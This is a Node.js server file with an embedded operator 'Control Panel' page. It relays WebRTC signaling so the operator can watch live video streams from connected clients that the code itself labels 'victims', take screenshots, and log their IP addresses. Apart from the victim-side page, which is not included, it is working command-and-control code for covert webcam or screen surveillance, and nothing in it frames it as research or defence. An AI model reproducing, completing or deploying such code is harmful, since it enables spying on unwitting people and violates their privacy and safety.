const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 8080;
const activeSessions = new Map();

app.use(express.json({limit: '50mb'}));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/control', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Control Panel</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: white; padding: 20px; }
    .header { text-align: center; margin-bottom: 30px; }
    h1 { background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 36px; }
    .stats { text-align: center; margin-bottom: 20px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
    .stat { background: rgba(255,255,255,0.1); padding: 12px 24px; border-radius: 20px; }
    .sessions { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
    .session-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px; }
    .session-card h3 { color: #667eea; margin-bottom: 10px; }
    .video-container { width: 100%; aspect-ratio: 16 / 9; background: #000; border-radius: 10px; overflow: hidden; margin: 15px 0; }
    video { width: 100%; height: 100%; object-fit: cover; }
    .controls { display: flex; gap: 10px; margin-top: 15px; }
    button { flex: 1; padding: 10px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
    .btn-snap { background: #4d96ff; color: white; }
    .no-sessions { grid-column: 1/-1; text-align: center; padding: 80px 20px; color: #666; }
    .logs { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px; margin-top: 30px; max-width: 1400px; margin-left: auto; margin-right: auto; }
    .log { background: rgba(0,0,0,0.3); padding: 8px; border-radius: 6px; margin: 5px 0; font-family: monospace; font-size: 12px; color: #aaa; }
  </style>
</head>
<body>
  <div class="header">
    <h1>Control Panel</h1>
    <p>Live Sessions</p>
  </div>
  <div class="stats">
    <div class="stat">Active: <strong id="count">0</strong></div>
    <div class="stat">Snapshots: <strong id="snaps">0</strong></div>
  </div>
  <div class="sessions" id="list">
    <div class="no-sessions">Waiting for victims...</div>
  </div>
  <div class="logs">
    <h3>Logs</h3>
    <div id="logs"></div>
  </div>
  <script src="/socket.io/socket.io.js"><\/script>
  <script>
    const socket = io();
    const sessions = new Map();
    const peerConnections = new Map();
    let snaps = 0;
    
    function log(msg) {
      const el = document.createElement('div');
      el.className = 'log';
      el.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      document.getElementById('logs').prepend(el);
    }
    
    socket.on('connect', () => {
      log('Connected to signaling server');
      socket.emit('get-sessions');
    });

    socket.on('session-list', (list) => {
      log('Received active sessions list (' + list.length + ')');
      list.forEach(id => {
        if (!sessions.has(id)) {
          sessions.set(id, { id: id });
          addCard(id);
        }
      });
    });
    
    socket.on('new-session', (data) => {
      log('New victim connected: ' + data.sessionId);
      if (sessions.has(data.sessionId)) return;
      sessions.set(data.sessionId, { id: data.sessionId });
      addCard(data.sessionId);
    });

    socket.on('session-gone', (data) => {
      log('Victim disconnected: ' + data.sessionId);
      removeCard(data.sessionId);
    });

    socket.on('ctrl-answer', (data) => {
      log('Received WebRTC answer from ' + data.sender);
      const pc = peerConnections.get(data.sender);
      if (pc) {
        pc.setRemoteDescription(new RTCSessionDescription(data.answer))
          .catch(err => log('SetRemoteDescription error: ' + err.message));
      }
    });

    socket.on('ctrl-ice', (data) => {
      const pc = peerConnections.get(data.sender);
      if (pc) {
        pc.addIceCandidate(new RTCIceCandidate(data.candidate))
          .catch(err => log('AddIceCandidate error: ' + err.message));
      }
    });
    
    function addCard(id) {
      const list = document.getElementById('list');
      const noSession = list.querySelector('.no-sessions');
      if (noSession) noSession.remove();
      
      if (document.getElementById('card-' + id)) return;
      
      const card = document.createElement('div');
      card.className = 'session-card';
      card.id = 'card-' + id;
      card.innerHTML = '<h3>' + id + '</h3><div class="video-container"><video id="vid-' + id + '" autoplay playsinline muted><\/video><\/div><div class="controls"><button class="btn-snap" onclick="snap(\'' + id + '\')">Screenshot<\/button><\/div>';
      list.appendChild(card);
      document.getElementById('count').textContent = list.querySelectorAll('.session-card').length;
      
      initPeerConnection(id);
    }

    function removeCard(id) {
      const card = document.getElementById('card-' + id);
      if (card) card.remove();
      
      sessions.delete(id);
      const pc = peerConnections.get(id);
      if (pc) {
        pc.close();
        peerConnections.delete(id);
      }

      const list = document.getElementById('list');
      const count = list.querySelectorAll('.session-card').length;
      document.getElementById('count').textContent = count;
      if (count === 0) {
        list.innerHTML = '<div class="no-sessions">Waiting for victims...</div>';
      }
    }

    function initPeerConnection(id) {
      if (peerConnections.has(id)) return;
      
      log('Initiating WebRTC connection for ' + id);
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      peerConnections.set(id, pc);

      pc.ontrack = (event) => {
        if (event.streams && event.streams[0]) {
          const video = document.getElementById('vid-' + id);
          if (video) {
            video.srcObject = event.streams[0];
            log('Media stream added to video element for ' + id);
          }
        }
      };

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          socket.emit('ctrl-ice', { target: id, candidate: event.candidate });
        }
      };

      pc.oniceconnectionstatechange = () => {
        log('WebRTC state for ' + id + ': ' + pc.iceConnectionState);
        if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
          removeCard(id);
        }
      };

      pc.createOffer()
        .then(offer => pc.setLocalDescription(offer))
        .then(() => {
          socket.emit('ctrl-offer', { target: id, offer: pc.localDescription });
        })
        .catch(err => log('Offer creation error for ' + id + ': ' + err.message));
    }
    
    function snap(id) {
      const vid = document.getElementById('vid-' + id);
      if (!vid || !vid.srcObject) { alert('Video not ready'); return; }
      const canvas = document.createElement('canvas');
      canvas.width = vid.videoWidth || 640;
      canvas.height = vid.videoHeight || 480;
      canvas.getContext('2d').drawImage(vid, 0, 0);
      const link = document.createElement('a');
      link.download = 'snap_' + id.substring(0, 8) + '.png';
      link.href = canvas.toDataURL('image/png');
      link.click();
      snaps++;
      document.getElementById('snaps').textContent = snaps;
    }
  <\/script>
</body>
</html>`);
});

io.on('connection', (socket) => {
  const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  console.log('[+] Connection: ' + socket.id + ' from ' + ip);
  
  socket.onAny((event, data) => {
    console.log('[' + socket.id + '] ' + event);
  });
  
  socket.on('get-sessions', () => {
    socket.isControl = true;
    socket.join('control-room');
    const activeList = Array.from(activeSessions.keys());
    socket.emit('session-list', activeList);
  });

  socket.on('victim-ready', () => {
    console.log('[VICTIM] Ready: ' + socket.id);
    activeSessions.set(socket.id, { socket, ip, time: Date.now() });
    io.to('control-room').emit('new-session', { sessionId: socket.id });
  });

  socket.on('ctrl-offer', (data) => {
    console.log(`[SIGNAL] Relay offer from control ${socket.id} to target victim ${data.target}`);
    const victim = activeSessions.get(data.target);
    if (victim) {
      victim.socket.emit('ctrl-offer', { offer: data.offer, target: socket.id });
    }
  });

  socket.on('ctrl-answer', (data) => {
    console.log(`[SIGNAL] Relay answer from victim ${socket.id} to target control ${data.target}`);
    io.to(data.target).emit('ctrl-answer', { sender: socket.id, answer: data.answer });
  });

  socket.on('ctrl-ice', (data) => {
    io.to(data.target).emit('ctrl-ice', { sender: socket.id, candidate: data.candidate });
  });
  
  socket.on('disconnect', () => {
    console.log('[-] Disconnect: ' + socket.id);
    if (activeSessions.has(socket.id)) {
      activeSessions.delete(socket.id);
      io.to('control-room').emit('session-gone', { sessionId: socket.id });
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
